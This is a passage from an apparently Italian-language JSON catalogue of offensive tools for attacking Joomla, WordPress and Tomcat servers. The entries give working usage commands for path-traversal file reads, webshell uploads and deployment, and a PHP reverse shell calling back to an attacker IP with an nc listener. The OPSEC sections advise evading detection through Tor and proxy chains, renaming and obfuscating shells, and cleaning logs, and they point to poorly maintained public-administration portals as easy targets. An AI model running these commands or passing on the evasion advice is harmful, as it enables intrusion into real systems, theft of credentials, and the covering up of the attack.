CSRF. E particolarmente utile quando si combinano credenziali di default note per Joomla con password trovate durante la fase di OSINT. In ambienti aziendali italiani, spesso i portali Joomla della Pubblica Amministrazione utilizzano credenziali deboli come admin/admin o varianti del nome dell'ente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera un volume elevato di richieste POST al path /administrator/index.php. I log di Joomla registrano ogni tentativo fallito con timestamp e IP sorgente. Plugin di sicurezza come AdminTools o RSFirewall bloccano automaticamente gli IP dopo un numero configurabile di tentativi falliti.</p><p><strong>Impatto operativo:</strong> Un bruteforce aggressivo puo causare il lockout dell'account amministratore legittimo se Joomla ha configurato il blocco dopo N tentativi falliti. Inoltre, il sovraccarico di sessioni PHP puo degradare le prestazioni del server, attirando l'attenzione degli amministratori di sistema.</p><p><strong>Mitigazioni:</strong> Utilizzare delay elevati tra i tentativi (3-5 secondi), limitare la wordlist a password probabili identificate durante la ricognizione, e ruotare gli IP sorgente attraverso una catena di proxy o Tor per evitare il ban basato su IP singolo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "joomla-dir-traversal",
    "name": "joomla_dir_trav.py",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Python per sfruttare vulnerabilità di Directory Traversal nel core di Joomla (es. CVE-2019-10945) ed estrarre file di configurazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Joomla_dir_trav.py e uno script Python progettato per sfruttare vulnerabilita di Directory Traversal (o Path Traversal) nel core di Joomla CMS. La vulnerabilita piu nota sfruttata da questo tool e la CVE-2019-10945, che consente a un utente autenticato (anche con privilegi minimi) di leggere file arbitrari dal filesystem del server manipolando i parametri della richiesta HTTP con sequenze di attraversamento come <code>../../../</code>. Il tool automatizza l'estrazione di file critici come <code>configuration.php</code> che contiene le credenziali del database, chiavi segrete e configurazioni SMTP, trasformando una vulnerabilita apparentemente minore in un vettore di compromissione completa del sistema.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Estrazione configuration.php:</strong> Il file <code>configuration.php</code> di Joomla contiene in chiaro le credenziali MySQL, il secret per i cookie di sessione, le credenziali SMTP e il path assoluto dell'installazione. L'estrazione automatizzata di questo file rappresenta spesso il punto di svolta di un intero assessment, poiche le credenziali del database vengono frequentemente riutilizzate per altri servizi.</p><p><strong>Lettura file di sistema:</strong> Oltre ai file applicativi, il tool permette di leggere file di sistema come <code>/etc/passwd</code>, <code>/etc/shadow</code> (se i permessi lo consentono), file di configurazione di altri servizi e chiavi SSH. Supporta la specifica di percorsi personalizzati per target specifici dove si conoscono i path di interesse.</p><p><strong>Bypass filtri di input:</strong> Include diverse tecniche di encoding e offuscamento delle sequenze di traversal per aggirare filtri di input basilari, come double encoding (<code>%252e%252e%252f</code>), null byte injection e path normalization tricks che funzionano su specifiche versioni di PHP e configurazioni del web server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script richiede un account valido su Joomla (anche con privilegi minimi come Registered). Si specifica il target URL, le credenziali e il file da estrarre.</p><pre><code># Estrazione del file configuration.php\npython3 joomla_dir_trav.py -u http://target.com -user guest -pass guest123 -f configuration.php\n\n# Lettura di /etc/passwd dal server\npython3 joomla_dir_trav.py -u http://target.com -user guest -pass guest123 -f /etc/passwd\n\n# Estrazione con encoding alternativo per bypass filtri\npython3 joomla_dir_trav.py -u http://target.com -user guest -pass guest123 -f configuration.php --encode double</code></pre><p>Una volta ottenuto il file configuration.php, le credenziali del database possono essere utilizzate per connettersi direttamente a MySQL e modificare la password dell'amministratore.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Questo tool e particolarmente efficace negli scenari dove si dispone di credenziali a basso privilegio (ottenute tramite registrazione pubblica o bruteforce) e si necessita di un percorso di escalation. La lettura del file di configurazione fornisce credenziali database che spesso consentono di creare un nuovo utente Super Administrator direttamente nel DB, oppure di accedere ad altri servizi della rete interna dove le stesse credenziali vengono riutilizzate. In contesti di Pubblica Amministrazione italiana, dove i CMS Joomla sono diffusissimi e spesso non aggiornati, questa vulnerabilita rimane sorprendentemente comune.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste contenenti sequenze <code>../</code> vengono tipicamente rilevate da WAF e IDS. I log del web server mostrano chiaramente i path manipolati nelle richieste GET o POST. ModSecurity con il ruleset OWASP CRS blocca questi tentativi di default.</p><p><strong>Impatto operativo:</strong> L'exploit richiede autenticazione, quindi il login viene registrato nei log di Joomla con username e timestamp. Se si utilizza un account registrato appositamente, questo crea una traccia diretta verso l'attaccante. La lettura di file sensibili non modifica il sistema ma puo esporre dati personali soggetti a normative GDPR.</p><p><strong>Mitigazioni:</strong> Utilizzare un account creato con dati fittizi attraverso Tor o VPN. Limitare le richieste allo stretto necessario (solo configuration.php) per minimizzare il rumore nei log. Verificare preventivamente la versione di Joomla per confermare la vulnerabilita prima di tentare l'exploit.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "wp-cve-2024-9047",
    "name": "CVE-2024-9047",
    "version": "2024-9047",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Exploit per vulnerabilità critica Path Traversal nel plugin WordPress \"File Upload\" che consente lettura/cancellazione file arbitrari.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CVE-2024-9047</strong> è una vulnerabilità ad alto impatto (CVSS 9.8) che colpisce il plugin \"WordPress File Upload\" (versioni <= 4.24.11). La falla risiede nella mancata sanitizzazione dei percorsi nel file <code>wfu_file_downloader.php</code>, permettendo a un attaccante non autenticato di leggere file sensibili (come <code>wp-config.php</code>) o cancellare file di sistema arbitrari, portando spesso alla compromissione totale del sito tramite estrazione di credenziali database o Denial of Service.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Arbitrary File Read:</strong> Sfrutta sequenze di path traversal (<code>../</code>) per evadere la directory di upload e scaricare file di configurazione critici contenenti salt, chiavi segrete e password database.</p><p><strong>Arbitrary File Deletion:</strong> Oltre alla lettura, l'exploit può essere adattato per cancellare file vitali per il funzionamento del server, causando un crash immediato dell'applicazione web.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script Python contro il target specificando il file da leggere.</p><pre><code># Lettura wp-config.php\npython3 exploit_cve_2024_9047.py -u https://target.com -f /var/www/html/wp-config.php\n\n# Verifica vulnerabilità (check non invasivo)\ncurl -v \"https://target.com/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=../../../../etc/passwd\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web App Pentest:</strong> Durante l'analisi di siti WordPress, questa CVE offre un vettore di accesso immediato (Initial Access) senza necessità di credenziali. È particolarmente efficace perché il plugin è molto diffuso (oltre 100k installazioni).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste HTTP contenenti <code>../</code> o percorsi assoluti sono facilmente rilevabili dai WAF. I log di accesso mostreranno chiamate anomale a <code>wfu_file_downloader.php</code>.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wp-wpdiscuz-rce",
    "name": "RCE - wpDiscuz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.exploit-db.com/exploits/49967",
    "desc": "Exploit per vulnerabilità Critical RCE nel plugin wpDiscuz (CVE-2020-24186) tramite upload immagini non sanitizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo exploit sfrutta la CVE-2020-24186, una vulnerabilita critica nel plugin wpDiscuz per WordPress con score CVSS 10.0. Il plugin, utilizzato per aggiungere un sistema di commenti avanzato ai siti WordPress, conteneva una falla nella funzionalita di upload degli allegati ai commenti: la validazione del tipo di file si basava esclusivamente sul MIME type dichiarato nel Content-Type header della richiesta HTTP, senza verificare il contenuto effettivo del file. Un attaccante puo quindi caricare un file PHP rinominandolo con estensione immagine ma con Content-Type manipolato, ottenendo esecuzione di codice remoto (RCE) sul server senza alcuna autenticazione preventiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Upload bypass con MIME type spoofing:</strong> L'exploit costruisce una richiesta multipart/form-data che invia un file PHP contenente una webshell, ma imposta il Content-Type a <code>image/jpeg</code> o <code>image/png</code>. Il plugin wpDiscuz valida solo questo header e accetta il file, salvandolo nella directory uploads di WordPress con estensione .php eseguibile dal web server Apache o Nginx.</p><p><strong>Rilevamento automatico della directory di upload:</strong> Lo script determina automaticamente il percorso esatto dove il file viene salvato analizzando la risposta del server dopo l'upload. Questo percorso include tipicamente la data corrente nel formato <code>/wp-content/uploads/YYYY/MM/</code>, necessario per costruire l'URL della webshell appena caricata.</p><p><strong>Shell interattiva integrata:</strong> Una volta caricato il payload PHP, l'exploit stabilisce automaticamente una sessione interattiva con la webshell, permettendo l'esecuzione di comandi di sistema direttamente dal terminale dell'attaccante senza necessita di tool aggiuntivi come curl o browser.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'exploit richiede Python 3 e la libreria requests. Il target deve avere wpDiscuz versione 7.0.4 o inferiore installato e attivo con i commenti abilitati su almeno un post.</p><pre><code># Esecuzione base contro un post con commenti abilitati\npython3 exploit.py -u http://target.com/2020/01/hello-world/ -p cmd.php\n\n# Con proxy per debug del traffico\npython3 exploit.py -u http://target.com/2020/01/sample-post/ -p shell.php --proxy http://127.0.0.1:8080\n\n# Upload di reverse shell PHP personalizzata\npython3 exploit.py -u http://target.com/blog/first-post/ -p revshell.php --payload custom_shell.php</code></pre><p>Dopo l'esecuzione, l'exploit restituisce l'URL della webshell caricata. Si consiglia di sostituire immediatamente la webshell con una reverse shell piu stabile e di eliminare ogni traccia dall'upload directory.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Questo exploit e devastante nei contesti di web penetration testing contro siti WordPress. La CVE-2020-24186 e una delle vulnerabilita piu gravi della storia di WordPress perche non richiede autenticazione e fornisce RCE diretto. E particolarmente rilevante perche wpDiscuz ha oltre 80.000 installazioni attive e molte non vengono aggiornate tempestivamente. In scenari red team, ottenere una shell sul web server e spesso il primo passo per pivotare nella rete interna dell'organizzazione attraverso la lettura del file wp-config.php e l'accesso al database.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'upload di un file .php nella directory dei commenti genera alert su qualsiasi soluzione di file integrity monitoring (Wordfence, Sucuri). I WAF come Cloudflare e ModSecurity bloccano richieste multipart contenenti codice PHP nel body. I log di Apache/Nginx registrano la richiesta POST di upload e le successive richieste GET alla webshell.</p><p><strong>Impatto operativo:</strong> Il file PHP rimane sul disco del server e puo essere scoperto da scansioni di sicurezza automatizzate. L'esecuzione di comandi come www-data lascia tracce nei log di sistema, nei process listing e potenzialmente nei log di audit SELinux o AppArmor.</p><p><strong>Mitigazioni:</strong> Eseguire l'exploit attraverso una catena di proxy. Eliminare la webshell immediatamente dopo aver stabilito una reverse shell piu stabile. Utilizzare una webshell con autenticazione per evitare che altri attaccanti la scoprano e la utilizzino. Ripulire i log di upload se si ottiene accesso sufficiente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wpxploit-1-0-0",
    "name": "wpxploit",
    "version": "1.0.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/relarizky/wpxploit",
    "desc": "Scanner di vulnerabilità WordPress automatizzato che controlla versioni core, temi e plugin contro database exploit noti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WPXploit</strong> è uno scanner di vulnerabilità automatizzato specifico per WordPress, progettato per identificare rapidamente debolezze di sicurezza in installazioni WP. Il tool esegue fingerprinting passivo e attivo dell'installazione target, rilevando versioni del core WordPress, temi installati e plugin attivi, per poi confrontarli con database di vulnerabilità note come Exploit-DB e WPVulnDB. È particolarmente efficace nel trovare installazioni obsolete con CVE pubbliche sfruttabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Version Fingerprinting:</strong> Identifica la versione esatta di WordPress analizzando meta tag, feed RSS, file readme e hash di file statici. Questa precisione è fondamentale per mappare le CVE applicabili alla specifica installazione.</p><p><strong>Plugin & Theme Enumeration:</strong> Enumera plugin e temi installati attraverso tecniche multiple: analisi del codice sorgente HTML, bruteforce di path comuni, e rilevamento di file readme.txt e changelog. Ogni componente trovato viene verificato contro database di exploit noti.</p><p><strong>User Enumeration:</strong> Estrae username validi tramite REST API (/wp-json/wp/v2/users), author archives (?author=N) e login error analysis, fornendo una lista di target per attacchi di password spraying.</p><p><strong>Backup & Config Discovery:</strong> Cerca file di backup esposti (.sql, .zip, .tar.gz), configurazioni wp-config.php.bak e directory listing abilitate che potrebbero esporre dati sensibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WPXploit è uno script Python che richiede Python 3 e le dipendenze specificate nel repository.</p><pre><code># Scansione completa di un target\npython3 wpxploit.py --url https://target.com\n\n# Enumerazione solo plugin\npython3 wpxploit.py --url https://target.com --plugins\n\n# Enumerazione utenti\npython3 wpxploit.py --url https://target.com --users\n\n# Output verboso con dettagli CVE\npython3 wpxploit.py --url https://target.com -v</code></pre><p>I risultati includono riferimenti diretti a Exploit-DB con link ai PoC disponibili per le vulnerabilità identificate.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Web Application Assessment</strong>, WPXploit fornisce una valutazione rapida della postura di sicurezza di siti WordPress, ideale per audit iniziali o verifiche periodiche.</p><p>Durante attività di <strong>Bug Bounty</strong>, permette di identificare velocemente target WordPress vulnerabili in scope ampi, prioritizzando quelli con CVE note e exploit pubblici.</p><p>Per <strong>Vulnerability Management</strong>, i team IT possono usarlo per verificare che le installazioni WordPress aziendali siano aggiornate e prive di componenti vulnerabili noti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La scansione genera traffico HTTP visibile nei log del web server. L'enumerazione di plugin tramite bruteforce produce molte richieste 404 che possono triggerare alert WAF o rate limiting.</p><p><strong>Impatto:</strong> Tool di sola lettura, non esegue exploit attivi. Non causa danni al target ma l'attività è facilmente riconducibile all'IP sorgente.</p><p><strong>Mitigazioni:</strong> Utilizzare proxy o VPN per anonimizzare la sorgente. Considerare WPScan come alternativa più completa e attivamente mantenuta per assessment professionali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wpxstrike",
    "name": "WPXStrike",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nowak0x01/WPXStrike",
    "desc": "Tool moderno per WordPress Recon e Exploit con focus su enumerazione aggressiva e rilevamento WAF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WPXStrike</strong> è un framework offensivo moderno per WordPress che combina ricognizione avanzata e capacità di exploitation in un unico strumento. A differenza degli scanner passivi, WPXStrike adotta un approccio aggressivo all'enumerazione, includendo moduli specifici per il rilevamento e bypass di WAF (Web Application Firewall), tecniche di evasione e automazione di attacchi comuni come XML-RPC abuse e credential stuffing. È ottimizzato per operazioni di red team e bug bounty su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Detection & Fingerprinting:</strong> Identifica la presenza di WAF come Cloudflare, Sucuri, Wordfence e ModSecurity analizzando header HTTP, comportamenti di blocco e response patterns. Questa informazione è cruciale per adattare le tecniche di attacco ed evitare ban immediati.</p><p><strong>XML-RPC Exploitation:</strong> Sfrutta l'endpoint xmlrpc.php per attacchi di credential bruteforce amplificato (system.multicall), pingback SSRF e user enumeration. Include payload ottimizzati per massimizzare i tentativi per richiesta aggirando rate limiting basilari.</p><p><strong>Aggressive Enumeration:</strong> Esegue crawling profondo del sito per scoprire plugin, temi, file di configurazione esposti e endpoint nascosti. Utilizza wordlist estese e tecniche di fuzzing per identificare risorse non linkate.</p><p><strong>Login Bruteforce:</strong> Modulo dedicato per attacchi a wp-login.php con supporto per proxy rotation, custom headers e delay configurabili per evadere protezioni anti-bot.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WPXStrike è uno script Python con interfaccia CLI ricca di opzioni per personalizzare l'aggressività della scansione.</p><pre><code># Scan completo con crawling\npython3 wpxstrike.py -u https://target.com --crawl\n\n# Rilevamento WAF\npython3 wpxstrike.py -u https://target.com --waf-detect\n\n# Enumerazione utenti via XML-RPC\npython3 wpxstrike.py -u https://target.com --xmlrpc-enum\n\n# Bruteforce credenziali con wordlist\npython3 wpxstrike.py -u https://target.com --brute -U users.txt -P passwords.txt\n\n# Scan stealth con delay\npython3 wpxstrike.py -u https://target.com --delay 2 --random-agent</code></pre><p>L'output include report dettagliati con severity rating per ogni finding e suggerimenti per l'exploitation manuale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Bug Bounty</strong>, WPXStrike eccelle nell'automazione della fase di discovery su programmi con molti asset WordPress, identificando rapidamente installazioni vulnerabili e misconfigurazioni sfruttabili.</p><p>Durante operazioni di <strong>Red Team</strong>, il modulo di WAF detection permette di adattare le tecniche di attacco all'infrastruttura difensiva presente, aumentando le probabilità di successo.</p><p>Per <strong>Penetration Testing</strong> di applicazioni WordPress custom, la combinazione di crawling aggressivo e fuzzing rivela funzionalità nascoste e endpoint non documentati che potrebbero sfuggire a scanner più conservativi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> WPXStrike è intrinsecamente rumoroso. La modalità aggressiva genera centinaia di richieste HTTP in breve tempo, producendo picchi di 404/403 nei log e potenzialmente triggerando ban IP automatici da parte di WAF e plugin di sicurezza WordPress.</p><p><strong>Impatto:</strong> Gli attacchi XML-RPC multicall possono sovraccaricare server poco performanti. Il bruteforce può causare lockout di account legittimi se il target implementa protezioni.</p><p><strong>Mitigazioni:</strong> Utilizzare sempre le opzioni --delay e --random-agent in ambienti di produzione. Ruotare gli IP sorgente tramite proxy pool. Verificare le regole di ingaggio prima di lanciare moduli di exploitation attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "phpbash",
    "name": "phpbash",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Arrexel/phpbash",
    "desc": "Webshell PHP con interfaccia terminale simulata nel browser, utile quando non è possibile stabilire connessioni reverse.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>phpbash e una webshell PHP interattiva che simula un terminale bash direttamente nel browser web. A differenza delle webshell tradizionali che offrono un semplice campo di input per i comandi, phpbash replica l'aspetto e il comportamento di un terminale Linux completo, inclusi il prompt con username e hostname, la navigazione delle directory con <code>cd</code> e il mantenimento dello stato della sessione tra i comandi. E progettata per scenari dove non e possibile stabilire una connessione reverse shell (ad esempio quando il firewall blocca tutte le connessioni in uscita) ma si ha la possibilita di caricare file PHP sul server tramite vulnerabilita di file upload, SQL injection con INTO OUTFILE, o accesso FTP.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Interfaccia terminale nel browser:</strong> L'interfaccia replica un emulatore di terminale completo con scrollback, history dei comandi (freccia su/giu), autocompletamento e output formattato. Utilizza AJAX per inviare i comandi al server PHP e ricevere l'output senza ricaricare la pagina, rendendo l'interazione fluida e simile a una sessione SSH reale.</p><p><strong>Persistenza della sessione di lavoro:</strong> Ogni comando viene eseguito nel contesto della directory corrente, mantenuta tramite variabili di sessione PHP. Questo significa che operazioni come <code>cd /var/www</code> seguite da <code>ls -la</code> funzionano correttamente, a differenza di molte webshell dove ogni comando viene eseguito in modo isolato dalla root del web server.</p><p><strong>File singolo e minimale:</strong> L'intera webshell e contenuta in un singolo file PHP di pochi kilobyte, facilmente caricabile attraverso qualsiasi vettore di upload. Non richiede dipendenze esterne, database o configurazioni aggiuntive. Basta copiare il file nella document root del web server e accedervi tramite browser.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il deployment consiste nel caricare il file PHP sul server target e accedervi tramite browser. Non richiede configurazione.</p><pre><code># Upload tramite vulnerabilita di file upload gia sfruttata\ncurl -F \"file=@phpbash.php\" http://target.com/upload.php\n\n# Accesso alla webshell dal browser\nhttp://target.com/uploads/phpbash.php\n\n# Comandi tipici una volta dentro la webshell\nwhoami\ncat /etc/passwd\nfind / -perm -4000 -type f 2>/dev/null\ncat wp-config.php</code></pre><p>Una volta ottenuto accesso tramite phpbash, il passo successivo e tipicamente tentare di stabilire una reverse shell piu stabile o eseguire privilege escalation sul sistema.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>phpbash e il tool ideale in due scenari specifici: quando il firewall del server blocca tutte le connessioni in uscita impedendo reverse shell, e quando si necessita di un accesso rapido e interattivo per esplorare il filesystem prima di decidere la strategia di escalation. E anche utile per dimostrazioni durante report di penetration test, poiche l'interfaccia visuale nel browser e immediatamente comprensibile anche per stakeholder non tecnici. In contesti CTF e ambienti di laboratorio, phpbash e frequentemente utilizzata come punto di partenza per sfide di privilege escalation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Qualsiasi soluzione antivirus o di file integrity monitoring (FIM) rileva phpbash come webshell malevola. Le firme sono ben note e presenti in ClamAV, YARA rules e soluzioni commerciali. I WAF analizzano le risposte HTTP contenenti output di comandi di sistema (come <code>/etc/passwd</code>) e bloccano la comunicazione.</p><p><strong>Impatto operativo:</strong> Ogni comando eseguito lascia tracce nei log del web server (richieste POST con parametri contenenti i comandi). La webshell non offre cifratura del traffico, quindi tutto il contenuto e visibile in chiaro a sistemi di network monitoring. Se scoperta, chiunque puo utilizzarla poiche non ha autenticazione integrata.</p><p><strong>Mitigazioni:</strong> Rinominare il file con un nome plausibile (es. <code>cache-handler.php</code>). Aggiungere un controllo di autenticazione basato su password o header HTTP personalizzato. Eliminare il file immediatamente dopo l'uso e verificare che non sia stato indicizzato da motori di ricerca attraverso il robots.txt o header X-Robots-Tag.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "php-reverse-shell",
    "name": "php-reverse-shell",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/pentestmonkey/php-reverse-shell",
    "desc": "La classica reverse shell in PHP di PentestMonkey: file singolo per ottenere accesso remoto da server web vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>La php-reverse-shell di PentestMonkey e probabilmente la reverse shell PHP piu utilizzata nella storia del penetration testing. Si tratta di un singolo file PHP che, quando eseguito dal web server target, stabilisce una connessione TCP in uscita verso la macchina dell'attaccante e redirige stdin, stdout e stderr di una shell <code>/bin/sh</code> attraverso questa connessione. A differenza di una bind shell (che apre una porta sul target), la reverse shell sfrutta il fatto che la maggior parte dei firewall permette il traffico in uscita, rendendo piu probabile il successo della connessione. Lo script gestisce automaticamente il processo di forking, la creazione del socket e il piping dei file descriptor, fornendo una shell interattiva completa.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Shell interattiva completa:</strong> Non si limita all'esecuzione di singoli comandi come <code>system()</code> o <code>exec()</code>. Crea un processo <code>/bin/sh</code> persistente con stdin e stdout collegati al socket TCP, permettendo comandi interattivi, piping e redirezione. Supporta l'upgrade a TTY completo tramite Python pty per abilitare funzionalita come <code>su</code>, <code>sudo</code> e editor di testo.</p><p><strong>Configurazione minimale:</strong> Richiede la modifica di sole due variabili nel file PHP: l'indirizzo IP dell'attaccante (<code>$ip</code>) e la porta di ascolto (<code>$port</code>). Non necessita di librerie esterne o estensioni PHP particolari, funzionando con qualsiasi installazione PHP standard che abbia la funzione <code>fsockopen()</code> abilitata.</p><p><strong>Compatibilita universale:</strong> Funziona su qualsiasi sistema operativo Unix-like (Linux, macOS, BSD) con PHP 4.x o superiore. Il codice e stato testato su decine di distribuzioni e configurazioni web server diverse (Apache, Nginx, LiteSpeed) garantendo la massima affidabilita in scenari reali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Modificare le variabili <code>$ip</code> e <code>$port</code> nel file PHP, caricare il file sul target e avviare un listener sulla macchina attaccante prima di triggerare l'esecuzione.</p><pre><code># 1. Configurare la reverse shell (modificare il file)\n$ip = '10.10.14.5';  // IP attaccante\n$port = 4444;          // Porta listener\n\n# 2. Avviare il listener sulla macchina attaccante\nnc -lvnp 4444\n\n# 3. Caricare e triggerare la shell\ncurl http://target.com/uploads/shell.php\n\n# 4. Upgrade a TTY interattivo (una volta connessi)\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'</code></pre><p>E essenziale avviare il listener prima di triggerare la shell, altrimenti la connessione fallisce silenziosamente e il processo PHP termina.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Questa reverse shell e il payload standard in qualsiasi scenario di file upload exploitation su server PHP. Dopo aver sfruttato una vulnerabilita di upload (come wpDiscuz, plugin WordPress vulnerabili, o form di upload non protetti), il passo successivo e quasi sempre caricare questa shell per ottenere accesso interattivo al sistema. E anche il punto di partenza per pivot nella rete interna, lettura di file di configurazione del database e privilege escalation verso root. In ambienti CTF e certificazioni come OSCP, la padronanza di questa shell e considerata fondamentale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il file e firmato da ogni antivirus e soluzione di sicurezza nota. Le funzioni PHP utilizzate (<code>fsockopen</code>, <code>proc_open</code>) sono monitorate da estensioni di sicurezza come Suhosin e PHP disable_functions. La connessione TCP in uscita verso una porta insolita e rilevabile da firewall e IDS di rete.</p><p><strong>Impatto operativo:</strong> La connessione reverse shell non e cifrata: tutto il traffico (comandi e output) transita in chiaro ed e intercettabile. La sessione non sopravvive al riavvio del web server o al timeout della connessione PHP. Il processo shell e visibile nella lista dei processi del sistema.</p><p><strong>Mitigazioni:</strong> Utilizzare porte comuni per il callback (80, 443) per mimetizzarsi nel traffico legittimo. Considerare alternative cifrate come reverse shell su HTTPS o tunnel SSH. Offuscare il codice PHP per evitare la detection basata su firma. Stabilire persistenza con metodi alternativi (crontab, SSH key) il prima possibile e rimuovere la webshell.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "tomcat-cmd-jsp",
    "name": "Tomcat_cmd.jsp",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SecurityRiskAdvisors/cmd.jsp",
    "desc": "Webshell JSP minimalista per Apache Tomcat che fornisce esecuzione comandi via parametro HTTP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Tomcat_cmd.jsp</strong> è una webshell minimalista scritta in Java Server Pages (JSP), progettata specificamente per server Apache Tomcat. La sua semplicità è intenzionale: poche righe di codice che implementano esclusivamente l'esecuzione di comandi di sistema, riducendo la superficie di detection e massimizzando la compatibilità. Viene tipicamente deployata tramite il Tomcat Manager Application quando si ottengono credenziali valide, o tramite vulnerabilità di arbitrary file upload in applicazioni Java.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Minimal Command Execution:</strong> Implementa un singolo endpoint che accetta comandi via parametro GET/POST e li esegue tramite <code>Runtime.getRuntime().exec()</code>. La semplicità del codice riduce le possibilità di errori e aumenta la compatibilità con diverse versioni di Tomcat.</p><p><strong>Cross-Platform Detection:</strong> Rileva automaticamente il sistema operativo e utilizza la shell appropriata: <code>cmd.exe /c</code> su Windows o <code>/bin/sh -c</code> su Linux/Unix. Questo garantisce funzionamento immediato senza modifiche manuali.</p><p><strong>Output Streaming:</strong> Cattura e restituisce sia stdout che stderr del comando eseguito, permettendo di vedere errori e output completo direttamente nel browser. Gestisce correttamente encoding e caratteri speciali.</p><p><strong>Stateless Operation:</strong> Non mantiene stato tra le richieste, non crea file temporanei, non richiede sessioni. Ogni richiesta è indipendente, semplificando l'utilizzo e riducendo le tracce.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il deployment tipico avviene tramite Tomcat Manager o upload diretto nella directory webapps.</p><pre><code># Deploy tramite Tomcat Manager (dopo aver ottenuto credenziali)\ncurl -u tomcat:password --upload-file cmd.jsp http://target:8080/manager/text/deploy?path=/cmd\n\n# Esecuzione comandi via GET\nhttp://target:8080/cmd/cmd.jsp?cmd=id\nhttp://target:8080/cmd/cmd.jsp?cmd=whoami\nhttp://target:8080/cmd/cmd.jsp?cmd=cat /etc/passwd\n\n# Comandi con spazi (URL encoded)\nhttp://target:8080/cmd/cmd.jsp?cmd=ls%20-la%20/tmp\n\n# Via curl per automazione\ncurl \"http://target:8080/cmd/cmd.jsp?cmd=uname%20-a\"</code></pre><p>Per comandi complessi o con caratteri speciali, utilizzare POST invece di GET per evitare problemi di URL encoding e limitazioni di lunghezza.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Tomcat 